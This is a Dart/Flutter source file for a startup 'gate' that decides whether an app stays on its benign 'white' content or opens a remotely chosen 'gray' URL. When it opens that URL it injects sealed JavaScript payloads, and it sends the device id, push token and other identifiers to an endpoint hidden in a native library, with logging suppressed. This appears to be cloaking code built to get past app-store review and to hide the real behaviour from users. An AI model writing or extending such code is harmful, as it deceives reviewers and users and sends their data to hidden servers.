// ignore_for_file: public_member_api_docs
//
// High-level orchestrator for the gray part.
//
// Flow:
//   1. Open `libgate_core.so`. If it isn't there — stay on the white part.
//   2. POST a device payload to the sealed config endpoint via the Rust
//      relay. Dart never learns the endpoint URL.
//   3. The response is a JSON object. If it contains a target to show,
//      we return a `GateResult` with that URL and the sealed JS payloads.
//   4. Otherwise we fall through to the white part.
//
// Everything that could be logged (`endpoint`, `body`, `target`, etc.)
// is kept inside functions and never written to stdout. `print()` is
// forbidden here — see the grep check in `tool/grep_check.sh`.

import 'dart:io';

import 'package:flutter/foundation.dart';

import 'gate_core.dart';
import 'sealed_ids.dart';

enum GateDecision { stayWhite, openGray }

class GateResult {
  const GateResult({
    required this.decision,
    this.target = '',
    this.userAgent = '',
    this.jsBootstrap = '',
    this.jsTelemetry = '',
    this.jsFrameCleanup = '',
  });

  factory GateResult.stayWhite() =>
      const GateResult(decision: GateDecision.stayWhite);

  final GateDecision decision;
  final String target;
  final String userAgent;
  final String jsBootstrap;
  final String jsTelemetry;
  final String jsFrameCleanup;

  bool get isGray => decision == GateDecision.openGray;
}

class GateService {
  const GateService();

  /// Decide between white and gray at startup. The call blocks on a
  /// network round-trip to the Rust relay (default 12s timeout inside
  /// the .so), so run it off the UI thread via `compute` or similar
  /// if the splash animation needs to keep running.
  Future<GateResult> decide({
    required String appVersion,
    String? deviceId,
    String? pushToken,
  }) async {
    final core = GateCore.open();
    if (core == null) return GateResult.stayWhite();

    final ua = core.userAgent(appVersion);
    if (ua.isEmpty) return GateResult.stayWhite();

    final payload = <String, dynamic>{
      'b': core.unsealString(SealedId.bundleId),
      'v': appVersion,
      'u': ua,
      'o': Platform.operatingSystemVersion,
      'd': deviceId ?? '',
      'p': pushToken ?? '',
    };

    final response = core.fetchConfig(payload);
    final target = _pickTarget(response, core);
    if (target.isEmpty) return GateResult.stayWhite();

    return GateResult(
      decision: GateDecision.openGray,
      target: target,
      userAgent: ua,
      jsBootstrap: core.unsealString(SealedId.jsBootstrap),
      jsTelemetry: core.unsealString(SealedId.jsTelemetryHook),
      jsFrameCleanup: core.unsealString(SealedId.jsFrameCleanup),
    );
  }

  String _pickTarget(Map<String, dynamic>? response, GateCore core) {
    if (response != null) {
      // Accept any of a few short field names so the server team can
      // reshape without a client release.
      for (final key in const ['t', 'url', 'target', 'u']) {
        final v = response[key];
        if (v is String && v.isNotEmpty) {
          return v;
        }
      }
    }
    // Fallback: the sealed `fallback_target`. Empty by default so we
    // stay on the white part.
    final fb = core.unsealString(SealedId.fallbackTarget);
    return fb;
  }
}

/// Debug-only logger. Compiles out in release so nothing ever reaches
/// logcat. Prefer `debugLog(() => '...')` so even the message string
/// isn't built in production.
void debugLog(String Function() build) {
  if (kDebugMode) {
    // ignore: avoid_print
    print(build());
  }
}
